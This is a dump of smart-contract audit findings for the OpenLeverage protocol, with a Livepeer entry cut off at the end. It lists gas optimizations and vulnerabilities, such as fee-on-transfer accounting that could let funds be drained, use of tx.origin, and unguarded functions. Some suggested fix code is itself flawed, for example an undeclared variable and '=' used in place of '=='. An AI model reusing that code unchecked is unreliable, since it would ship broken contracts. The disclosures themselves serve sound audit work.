{"title": "User reward can get stuck", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/215", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "User reward can get stuck"}, {"title": "Gas savings and corrections", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/212", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas savings and corrections"}, {"title": "Unused library `ReentrancyGuard`", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/209", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  WatchPug   # Vulnerability details  The library `ReentrancyGuard` is imported and inherited, but the modifier `nonReentrant` is unused.  https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/liquidity/LPoolDepositor.sol#L14-L14  ```solidity contract LPoolDepositor is ReentrancyGuard { ```  ### Recommendation  Remove the import and change to:  ```solidity contract LPoolDepositor { ```  "}, {"title": "`UniV2ClassDex.sol#uniClassSell()` Tokens with fee on transfer are not fully supported", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/208", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L31-L56  ```solidity function uniClassSell(DexInfo memory dexInfo,     address buyToken,     address sellToken,     uint sellAmount,     uint minBuyAmount,     address payer,     address payee ) internal returns (uint buyAmount){     address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);     IUniswapV2Pair(pair).sync();     (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();     sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);     uint balanceBefore = IERC20(buyToken).balanceOf(payee);     dexInfo.fees = getPairFees(dexInfo, pair);     if (buyToken < sellToken) {         buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);         IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");     } else {         buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);         IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");     }      require(buyAmount >= minBuyAmount, 'buy amount less than min');     uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);     return bought; } ```  While `uniClassBuy()` correctly checks the actually received amount by comparing the before and after the balance of the receiver, `uniClassSell()` trusted the result given by `getAmountOut()`. This makes `uniClassSell()` can result in an output amount fewer than `minBuyAmount`.  https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L101-L102  ### Recommendation  Change to:  ```solidity function uniClassSell(DexInfo memory dexInfo,     address buyToken,     address sellToken,     uint sellAmount,     uint minBuyAmount,     address payer,     address payee ) internal returns (uint bought){     address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);     IUniswapV2Pair(pair).sync();     (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();     sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);     uint balanceBefore = IERC20(buyToken).balanceOf(payee);     dexInfo.fees = getPairFees(dexInfo, pair);     if (buyToken < sellToken) {         buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);         IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");     } else {         buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);         IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");     }     uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);     require(bought >= minBuyAmount, 'buy amount less than min'); } ```  "}, {"title": "Misc", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/198", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Misc"}, {"title": "Bad actor may steal deposit return when liquidating a trade", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/195", "labels": ["bug", "1 (Low Risk)"], "target": "2022-01-openleverage-findings", "body": "Bad actor may steal deposit return when liquidating a trade"}, {"title": "The check for `max rate 1000 ole` should be inclusive", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/164", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "The check for `max rate 1000 ole` should be inclusive"}, {"title": "endTime can be before startTime", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/160", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  samruna   # Vulnerability details  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OLETokenLock.sol#L66  In the above code, there is no check to see if endTime is before startTime. Due to this past beneficiaries can be transferred additional tokens  Action: check if endTime if always in future.  "}, {"title": "Gas: `// Shh - currently unused`", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/153", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas: `// Shh - currently unused`"}, {"title": "Gas in `LPool.sol:availableForBorrow()`: Avoid expensive calculation with an inclusive inequality", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/148", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas in `LPool.sol:availableForBorrow()`: Avoid expensive calculation with an inclusive inequality"}, {"title": "`ControllerStorage`: related market data should be grouped in a struct", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/146", "labels": ["bug", "0 (Non-critical)"], "target": "2022-01-openleverage-findings", "body": "`ControllerStorage`: related market data should be grouped in a struct"}, {"title": "Gas Optimization: Tight variable packing in `LPoolStorage.sol`", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/140", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-01-openleverage-findings", "body": "Gas Optimization: Tight variable packing in `LPoolStorage.sol`"}, {"title": "Gas in `Adminable.sol:acceptAdmin()`: SLOADs minimization", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/137", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas in `Adminable.sol:acceptAdmin()`: SLOADs minimization"}, {"title": "Gas: Tautology on \"variable >= 0\" which is always true as variable is uint", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/132", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Increased gas cost, as a variable of type `uint` will always be `>= 0`, therefore the check isn't necessary.    ## Proof of Concept   ``` contracts\\XOLE.sol:327:        require(_locked.amount >= 0, \"Nothing to withdraw\"); ```   ## Tools Used   VS Code      ## Recommended Mitigation Steps   Delete the `>= 0` check  "}, {"title": "Gas: Shift Right instead of Dividing by 2", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/131", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas: Shift Right instead of Dividing by 2"}, {"title": "Gas: \"constants\" expressions are expressions, not constants. Use \"immutable\" instead.", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/123", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas: \"constants\" expressions are expressions, not constants. Use \"immutable\" instead."}, {"title": "use require instead if/else", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/121", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "use require instead if/else"}, {"title": "unnecessary uint declaration", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/117", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "unnecessary uint declaration"}, {"title": "Gas saving optimizing storage", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/116", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas saving optimizing storage"}, {"title": "Gas saving optimizing setImplementation", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/115", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas saving optimizing setImplementation"}, {"title": "Anyone can claim airdrop amounts on behalf of anyone", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/107", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Anyone can claim airdrop amounts on behalf of anyone"}, {"title": "OpenLevV1.closeTrade with V3 DEX doesn't correctly accounts fee on transfer tokens for repayments", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/104", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  The amount that OpenLevV1 will receive can be less than V3 DEX indicated as a swap result, while it is used as given for position debt repayment accounting.  This way actual funds received can be less than accounted, leaving to system funds deficit, which can be exploited by a malicious user, draining contract funds with multiple open/close with a taxed token.  In the `trade.depositToken != longToken` case when `flashSell` is used this can imply inability to send remainder funds to a user and the failure of the whole closeTrade function, the end result is a freezing of user's funds within the system.  ## Proof of Concept  `trade.depositToken != longToken` case, can be wrong repayment accounting, which will lead to a deficit if the received funds are less than DEX returned `closeTradeVars.receiveAmount`.  As a side effect, `doTransferOut` is done without balance check, so the whole position close can revert, leading to inability to close the position and freeze of user's funds this way:  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L197-204   I.e. if there is enough funds in the system they will be drained, if there is not enough funds, user's position close will fail.   V3 sell function doesn't check for balance change, using DEX returned amount as is:  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/eth/UniV3Dex.sol#L61-70  ## Recommended Mitigation Steps  If fee on tranfer tokens are fully in scope, do control all the accounting and amounts to be returned to a user via balance before/after calculations for DEX V3 logic as well.  "}, {"title": "OpenLevV1.closeTrade can save trade.deposited to memory", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/102", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "OpenLevV1.closeTrade can save trade.deposited to memory"}, {"title": "using > instead of >=", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/100", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "using > instead of >="}, {"title": "UniV3Dex uniV3Buy slippage check error message is misleading", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/88", "labels": ["bug", "1 (Low Risk)"], "target": "2022-01-openleverage-findings", "body": "UniV3Dex uniV3Buy slippage check error message is misleading"}, {"title": "Race condition in approve()", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/87", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Race condition in approve()"}, {"title": "uniV2Buy calls buyAmount.toAmountBeforeTax twice, while it's constant", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/86", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "uniV2Buy calls buyAmount.toAmountBeforeTax twice, while it's constant"}, {"title": "transferAllowed does not fail", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/83", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  GeekyLumberjack   # Vulnerability details  ## Impact [transferTokens()](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L95-L135) will not fail when calling [transferAllowed()](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/ControllerV1.sol#L88-L91) both [transfer()](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L141) and [transferFrom()](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L150) rely on transferTokens(). Both the name of the function transferAllowed() and the [comments](https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L99) above the call show there should be some cases that cause these functions to fail in transferAllowed.   ## Tools Used Manual review  ## Recommended Mitigation Steps Update transfer allowed to include required failures. If there are none, update the comments and the name of the function.  "}, {"title": "Gas saving by caching state variables", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/82", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-01-openleverage-findings", "body": "Gas saving by caching state variables"}, {"title": "Eth sent to Timelock will be locked in current implementation", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/80", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Eth sent to Timelock will be locked in current implementation"}, {"title": "Unused parameters in OpenLevV1 and ControllerV1 functions", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/79", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Unused parameters in OpenLevV1 and ControllerV1 functions"}, {"title": "unnecessary msg.sender cache", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "unnecessary msg.sender cache"}, {"title": "FarmingPools' notifyRewardAmounts and initDistributions do not check the lengths of input arrays", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/76", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  hyh   # Vulnerability details   ## Impact  On calling with arrays of different lengths various malfunctions are possible as the arrays are used as given. System then will fail with low level array access message  ## Proof of Concept  notifyRewardAmounts:  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/farming/FarmingPools.sol#L163   initDistributions:  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/farming/FarmingPools.sol#L131  ## Recommended Mitigation Steps  Require that (stakeTokens, reward) and (stakeTokens, startTimes, durations) arrays' lengths match within each set   "}, {"title": "OpenLevV1Lib's and LPool's doTransferOut functions call native payable.transfer, which can be unusable for smart contract calls", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/75", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  hyh   # Vulnerability details  ## Impact  When OpenLev operations use a wrapped native token, the whole user withdraw is being handled with a `payable.transfer()` call.  This is unsafe as `transfer` has hard coded gas budget and can fail when the user is a smart contract. This way any programmatical usage of OpenLevV1 and LPool is at risk.  Whenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time.  As OpenLevV1 `closeTrade` is affected this includes user's principal funds freeze scenario, so marking the issue as a high severity one.  ## Proof of Concept  OpenLevV1Lib and LPool have `doTransferOut` function that calls native token payable.transfer:  OpenLevV1Lib.doTransferOut  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253   LPool.doTransferOut  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L297   LPool.doTransferOut is used in LPool redeem and borrow, while OpenLevV1Lib.doTransferOut is used in OpenLevV1 trade manipulation logic:  closeTrade  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L204  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L215   liquidate  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L263  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L295  https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L304   ## References  The issues with `transfer()` are outlined here:  https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/   ## Recommended Mitigation Steps  OpenLevV1's `closeTrade` and `liquidate` as well as LPool's `redeem`, `redeemUnderlying`, `borrowBehalf`, `repayBorrowBehalf`, `repayBorrowEndByOpenLev` are all `nonReentrant`, so reentrancy isn't an issue and `transfer()` can be just replaced.  Using low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60  "}, {"title": "declaring that contract is using `Utils` lib can use more gas", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/73", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "declaring that contract is using `Utils` lib can use more gas"}, {"title": "caching struct data type in memory cost more gas", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "caching struct data type in memory cost more gas"}, {"title": "pass the `dexInfo[dexName[i]` value without caching `DexInfo struct`", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/71", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  rfa   # Vulnerability details  ## Impact expensive gas ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/dex/bsc/BscDexAggregatorV1.sol#L47   ## Recommended Mitigation Steps replace the 2 lines of code by just 1 line: ``` dexInfo[dexName[i]] = DexInfo(factoryAddr[i], fees[i]); ```  "}, {"title": "unnecessary _unsedFactory call", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "unnecessary _unsedFactory call"}, {"title": "The initialize function can be called multiple times", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/67", "labels": ["bug", "0 (Non-critical)"], "target": "2022-01-openleverage-findings", "body": "The initialize function can be called multiple times"}, {"title": "set pancakeFactory to constant", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/66", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "set pancakeFactory to constant"}, {"title": "No Transfer Ownership Pattern", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/65", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "No Transfer Ownership Pattern"}, {"title": "UniV2Dex and UniV2ClassDex use hard coded factory addresses for Pair and PairFees getters", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/64", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "UniV2Dex and UniV2ClassDex use hard coded factory addresses for Pair and PairFees getters"}, {"title": "Using `require` instead of `&&` can save gas", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Using `require` instead of `&&` can save gas"}, {"title": "Missing payable", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/61", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  robee   # Vulnerability details  The following functions are not payable but uses msg.value - therefore the function must be payable. This can lead to undesired behavior.          LPool.sol, addReserves should be payable since using msg.value   "}, {"title": "Use of tx.origin in ControllerV1.sol", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/60", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In ControllerV1.sol in the updatePriceAllowed() function tx.origin is used.  tx.origin is a global variable in Solidity which returns the address of the account that sent the transaction. Using the variable could make a contract vulnerable if an authorized account calls into a malicious contract.  ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/ControllerV1.sol#L163  https://swcregistry.io/docs/SWC-115  ## Tools Used Manual code review   ## Recommended Mitigation Steps Its recommended to use msg.sender instead  "}, {"title": "no validation checks in ControllerV1.sol initialize function()", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/57", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "no validation checks in ControllerV1.sol initialize function()"}, {"title": "Anyone can call release() in OLETokenLock.sol", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/56", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact In OLETokenLock.sol,  the release() function distributes all the allotted tokens to the beneficiaries but it can be called by anyone.  This should be an admin protected function as it's very important and deals with the transfer of tokens to beneficiaries which should not be accessed by simply anyone.   ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OLETokenLock.sol#L39  ## Tools Used Manual code review   ## Recommended Mitigation Steps OLETokenLock.sol should inherit the Adminable.sol contract and add require(msg.sender = admin, \"Not Authorized\"); to the release() function.   "}, {"title": "mint() function doesn't require 0 to be larger than 0", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/55", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "mint() function doesn't require 0 to be larger than 0"}, {"title": "No validation for constructor arguments in OLEToken.sol", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/53", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "No validation for constructor arguments in OLEToken.sol"}, {"title": "Does not validate the input fee parameter", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/50", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Does not validate the input fee parameter"}, {"title": "Not verified input", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/49", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Not verified input"}, {"title": "Two arrays length mismatch", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/46", "labels": ["bug", "0 (Non-critical)"], "target": "2022-01-openleverage-findings", "body": "Two arrays length mismatch"}, {"title": "Never used parameters", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/45", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Never used parameters"}, {"title": "In the following public update functions no value is returned", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/44", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "In the following public update functions no value is returned"}, {"title": "Assert instead require to validate user inputs", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/43", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "Assert instead require to validate user inputs"}, {"title": "Named return issue", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/39", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Named return issue"}, {"title": "Require with not comprehensive message", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/31", "labels": ["bug", "0 (Non-critical)"], "target": "2022-01-openleverage-findings", "body": "Require with not comprehensive message"}, {"title": "Require with empty message", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/30", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Require with empty message"}, {"title": "Use calldata instead of memory", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/29", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Use calldata instead of memory"}, {"title": "Inline one time use functions", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Inline one time use functions"}, {"title": "Mult instead div in compares", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/23", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Mult instead div in compares"}, {"title": "Unused inheritance", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/22", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-01-openleverage-findings", "body": "Unused inheritance"}, {"title": "Use != 0 instead of > 0", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/21", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Use != 0 instead of > 0"}, {"title": "Unnecessary equals boolean", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/20", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Unnecessary equals boolean"}, {"title": "Check if amount is not zero to save gas", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Check if amount is not zero to save gas"}, {"title": "Upgrade pragma to at least 0.8.4", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Upgrade pragma to at least 0.8.4"}, {"title": "Caching array length can save gas", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/15", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-01-openleverage-findings", "body": "Caching array length can save gas"}, {"title": "Prefix increments are cheaper than postfix increments", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Prefix increments are cheaper than postfix increments"}, {"title": "Unnecessary array boundaries check when loading an array element twice", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/12", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Unnecessary array boundaries check when loading an array element twice"}, {"title": "State variables that could be set immutable", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "State variables that could be set immutable"}, {"title": "Short the following require messages", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/6", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Short the following require messages"}, {"title": "Use bytes32 instead of string to save gas whenever possible", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Use bytes32 instead of string to save gas whenever possible"}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/2", "labels": ["bug", "0 (Non-critical)"], "target": "2022-01-openleverage-findings", "body": "Unused imports"}, {"title": "Gas: Use `msg.sender` directly instead of caching it in a variable", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/244", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-livepeer-findings", "body": "Gas: Use `msg.sender` directly instead of caching it in a variable"}, {"title": "Gas: use `msg.sender` instead of OpenZeppelin's `_msgSender()` when GSN capabilities aren't used", "html_url": "https://github.com/code-423n4/2022-01-livepeer-findings/issues/243", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-livepeer-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact `msg.sender` costs 2 gas (CALLER opcode). `_msgSender()` represents the following: ``` function _msgSender() internal view virtual returns (address payable) {     return msg.sender; } ``` When no GSN capabilities are used: `msg.sender` is enough.  See https://docs.openzeppelin.com/contracts/2.x/gsn for more information about GSN capabilities.  ## Proof of Concept Instances include: ``` arbitrum-lpt-bridge\\contracts\\L1\\escrow\\L1Escrow.sol:18:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());     arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:133:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:83:        _setupRole(DEFAULT_ADMIN_ROLE, _msgSender()); 